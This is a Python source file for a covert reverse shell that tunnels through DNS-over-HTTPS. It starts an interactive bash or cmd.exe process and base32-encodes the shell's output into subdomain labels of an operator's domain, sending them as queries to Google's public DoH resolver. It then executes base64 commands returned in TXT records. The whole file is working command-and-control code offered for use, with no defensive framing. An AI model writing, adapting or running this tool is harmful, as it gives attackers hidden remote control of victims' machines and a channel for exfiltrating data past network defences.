import socket
import subprocess
import sys
import threading
import requests
import queue
import base64
import time


dataqueue= queue.Queue()
sendqueue= queue.Queue()
senddns = "send.example.com"  #use your own domian


dnsproviders=["https://dns.google.com/resolve?name=%DOMAIN&type=TXT"#,
#"https://cloudflare-dns.com/dns-query?name=%DOMAIN&type=TXT",
#"https://dns9.quad9.net/dns-query?name=%DOMAIN&type=TXT"
]
#"https://dns10.quad9.net/dns-query?name=%DOMAIN&type=TXT"


headers={'accept':'application/dns-json'}

maxsize=234   #253-len("."+senddns) =237 -math.floor(237/maxlength)=234   63.63.63.45.send.reyals.net
maxbytesize=145  #maxsize/1.6 round down to nearest factor of 5
maxlength=63  #maxium length of a subdomain

def addouttoque(out, que):
    while 1:
        que.put(out.readline())

def processqueue(inque,outque):
    buffer=b''
    while not outque.empty():  #grab data from last loop
        buffer=buffer+outque.get_nowait()

    while not inque.empty():  #grab some new data from the queue
        nextitem=inque.get_nowait()
        buffer=buffer+nextitem
        if len(buffer)>=maxbytesize:  #enough to send; start processing
            break
    
    if len(buffer)>maxbytesize:
        outque.put(buffer[maxbytesize:])  #save for next loop
        buffer=buffer[0:maxbytesize]

    answer=base64.b32encode(buffer).replace(b"=",b"")  #base 32 encode it and trim any = padding

    #break the answer up so none of the subdomains are longer then maxlength
    subdomains=round(len(answer)/maxlength-.5)
    for i in range(1,subdomains+1):
        answer=answer[0:i*maxlength]+b"."+answer[i*maxlength:]
    return answer.lower()


if 'linux' in sys.platform:
    p = subprocess.Popen(["/bin/bash","-i"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=1)
elif 'win' in sys.platform:
    p = subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=1)
else:
    print('not sure of OS?')
    print(sys.platform)
    exit(1)

t = threading.Thread(target=addouttoque, args=(p.stdout, dataqueue))
t.daemon = True 
t.start()

#if you want stderr as well.
#t2 = threading.Thread(target=addouttoque, args=(p.stderr, dataqueue))
#t2.daemon = True 
#t2.start()


while 1:
    tosend=processqueue(dataqueue,sendqueue) #do we have anything to send
    if len(tosend)==0:
        time.sleep(2)
        resp=requests.get(dnsproviders[round(time.time())%len(dnsproviders)].replace("%DOMAIN",senddns),headers=headers)
    else:
        resp=requests.get(dnsproviders[round(time.time())%len(dnsproviders)].replace("%DOMAIN",tosend.decode('ascii')+"."+senddns),headers=headers)

    try:
        command=resp.json()['Answer'][0]['data'].strip('"')
    except:  #something wrong with the response received, possibly server down
        command='ACK'
        print(resp.text)

    try:
        cmd=base64.b64decode(command) #if fails to decode will just trigger exception
        print('Command received:'+cmd.decode('ascii'))
        if cmd.decode('ascii') == 'exit\n':
            print('exiting')
            break
        p.stdin.write(cmd)
        p.stdin.flush()
    except:
        pass
        #print('Not a command:'+command)

    time.sleep(1)

exit(0)